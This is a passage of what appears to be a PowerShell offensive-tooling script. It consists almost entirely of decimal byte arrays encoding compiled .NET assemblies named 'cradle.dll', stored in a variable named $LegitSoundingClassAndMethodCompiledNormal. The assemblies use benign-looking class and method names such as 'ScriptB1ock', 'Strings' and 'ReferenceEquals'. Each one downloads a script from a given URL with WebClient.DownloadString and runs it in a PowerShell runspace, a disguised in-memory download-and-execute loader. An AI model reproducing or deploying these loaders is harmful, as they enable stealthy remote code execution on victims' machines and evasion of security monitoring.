0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`169,46,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(160,36,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,4,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,168,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,120,3,0,0,8,0,0,0,35,85,83,0,128,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,144,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,49,0,42,0,6,0,105,0,73,0,6,0,137,0,73,0,10,0,242,0,203,0,10,0,2,1,203,0,10,0,31,1,174,0,14,0,73,1,62,1,6,0,139,1,108,1,10,0,152,1,174,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,56,0,10,0,1,0,146,32,0,0,0,0,134,24,63,0,15,0,2,0,0,0,1,0,69,0,17,0,63,0,19,0,25,0,63,0,15,0,33,0,11,1,33,0,41,0,26,1,15,0,49,0,42,1,38,0,49,0,49,1,43,0,57,0,63,0,15,0,57,0,83,1,49,0,49,0,98,1,54,0,49,0,161,1,60,0,9,0,63,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(167,0,0,0,4)+@(0)*11+@(1,0,33,0,0,0,0,0,3)+@(0)*11+@(24,0,174,0,0,0,0,0,4)+@(0)*11+@(1,0,42)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,83,99,114,105,112,116,66,49,111,99,107,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,3,32,0,0,0,0,0,77,194,21,12,49,197,108,66,156,112,79,52,148,35,180,79,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,200,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`200,46,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(228,36,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,60,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,200,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,168,3,0,0,8,0,0,0,35,85,83,0,176,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,192,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,49,0,42,0,6,0,123,0,91,0,6,0,155,0,91,0,10,0,4,1,221,0,10,0,20,1,221,0,10,0,49,1,192,0,14,0,91,1,80,1,6,0,116,1,42,0,6,0,171,1,140,1,10,0,184,1,192,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,56,0,10,0,1,0,157,32,0,0,0,0,134,24,63,0,16,0,3,0,0,0,1,0,69,0,0,0,2,0,73,0,17,0,63,0,20,0,25,0,63,0,16,0,33,0,29,1,34,0,41,0,44,1,16,0,49,0,60,1,39,0,49,0,67,1,44,0,57,0,63,0,16,0,57,0,101,1,50,0,65,0,123,1,55,0,49,0,130,1,62,0,49,0,193,1,68,0,9,0,63,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(185,0,0,0,4)+@(0)*11+@(1,0,33,0,0,0,0,0,3)+@(0)*11+@(25,0,192,0,0,0,0,0,4)+@(0)*11+@(1,0,42)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,83,99,114,105,112,116,66,49,111,99,107,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,3,59,0,0,0,0,0,18,241,254,203,190,212,182,69,149,189,246,141,241,68,201,62,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,12,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('Strings'       , 'ReferenceEquals'   , @("$CompiledHeader`182,47,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(44,35,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,180,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,216,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,80,2,0,0,8,0,0,0,35,85,83,0,88,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,104,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,45,0,38,0,6,0,106,0,74,0,6,0,138,0,74,0,10,0,190,0,179,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,52,0,10,0,1,0,109,32,0,0,0,0,134,24,68,0,15,0,2,0,0,0,1,0,175,0,17,0,68,0,19,0,25,0,68,0,15,0,33,0,68,0,15,0,33,0,200,0,24,0,9,0,68,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(168,0,0,0,2)+@(0)*11+@(1,0,29,0,0,0,0,0,2)+@(0)*11+@(1,0,38)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,83,116,114,105,110,103,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,82,101,102,101,114,101,110,99,101,69,113,117,97,108,115,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,3,32,0,0,0,0,0,186,232,142,139,3,172,191,75,137,175,89,143,62,124,95,146,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,84,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`204,47,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,254,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(168,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,4,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(224,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,12,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,176,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,128,3,0,0,8,0,0,0,35,85,83,0,136,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,152,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,45,0,38,0,6,0,110,0,78,0,6,0,142,0,78,0,10,0,247,0,208,0,10,0,7,1,208,0,10,0,36,1,179,0,14,0,78,1,67,1,6,0,144,1,113,1,10,0,157,1,179,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,52,0,10,0,1,0,146,32,0,0,0,0,134,24,68,0,15,0,2,0,0,0,1,0,74,0,17,0,68,0,19,0,25,0,68,0,15,0,33,0,16,1,33,0,41,0,31,1,15,0,49,0,47,1,38,0,49,0,54,1,43,0,57,0,68,0,15,0,57,0,88,1,49,0,49,0,103,1,54,0,49,0,166,1,60,0,9,0,68,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(172,0,0,0,4)+@(0)*11+@(1,0,29,0,0,0,0,0,3)+@(0)*11+@(24,0,179,0,0,0,0,0,4)+@(0)*11+@(1,0,38)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,83,116,114,105,110,103,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,82,101,102,101,114,101,110,99,101,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,32,0,0,0,0,0,40,138,71,22,250,126,255,76,131,142,19,214,87,13,61,38,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,208,36)+@(0)*8+@(0,0,238,36,0,0,0,32)+@(0)*22+@(224,36)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*266+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0